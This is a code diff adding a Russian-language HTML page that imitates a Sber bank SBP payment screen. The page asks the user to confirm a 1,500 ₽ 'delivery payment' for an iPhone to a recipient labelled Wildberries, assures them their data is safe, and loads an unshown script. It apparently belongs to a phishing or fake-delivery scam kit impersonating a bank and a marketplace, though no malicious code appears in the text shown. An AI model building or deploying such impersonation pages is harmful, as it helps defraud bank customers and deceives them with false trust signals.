@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Оплата по СБП - Банк</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="bank-payment.css">
+</head>
+<body>
+    <div class="animated-bg">
+        <div class="gradient-orb orb-1"></div>
+        <div class="gradient-orb orb-2"></div>
+        <div class="gradient-orb orb-3"></div>
+    </div>
+
+    <div class="bank-payment-container">
+        <div class="bank-header">
+            <div class="bank-logo-large" id="bankLogoLarge">
+                <div class="logo-text">Сбер</div>
+            </div>
+            <h1 class="bank-title">Оплата по СБП</h1>
+            <p class="bank-subtitle">Быстрый перевод через Систему быстрых платежей</p>
+        </div>
+
+        <div class="payment-card glass-effect">
+            <div class="payment-details">
+                <div class="detail-row">
+                    <span class="detail-label">Получатель:</span>
+                    <span class="detail-value">Wildberries</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">СБП номер:</span>
+                    <span class="detail-value sbp-number" id="bankSbpNumber">2000123456789</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Сумма:</span>
+                    <span class="detail-value amount-large" id="bankAmount">1 500 ₽</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Назначение:</span>
+                    <span class="detail-value">Оплата доставки iPhone 17 Pro Max</span>
+                </div>
+            </div>
+
+            <form class="bank-payment-form" id="bankPaymentForm">
+                <div class="form-section">
+                    <label class="form-label">С карты</label>
+                    <select class="form-select" id="cardSelect" required>
+                        <option value="">Выберите карту</option>
+                        <option value="card1">**** 1234 (Основная)</option>
+                        <option value="card2">**** 5678 (Резервная)</option>
+                    </select>
+                </div>
+
+                <div class="form-section">
+                    <label class="form-label">Подтверждение</label>
+                    <div class="confirm-checkbox">
+                        <input type="checkbox" id="confirmPayment" required>
+                        <label for="confirmPayment">
+                            Подтверждаю перевод на сумму <strong id="confirmAmount">1 500 ₽</strong> получателю <strong>Wildberries</strong>
+                        </label>
+                    </div>
+                </div>
+
+                <button type="submit" class="bank-pay-btn" id="bankPayBtn">
+                    <span class="btn-icon">💳</span>
+                    <span class="btn-text">Оплатить</span>
+                </button>
+            </form>
+        </div>
+
+        <div class="security-info">
+            <div class="security-icon">🔒</div>
+            <p>Платеж защищен системой СБП. Ваши данные в безопасности.</p>
+        </div>
+    </div>
+
+    <script src="bank-payment.js"></script>
+</body>
+</html>
+
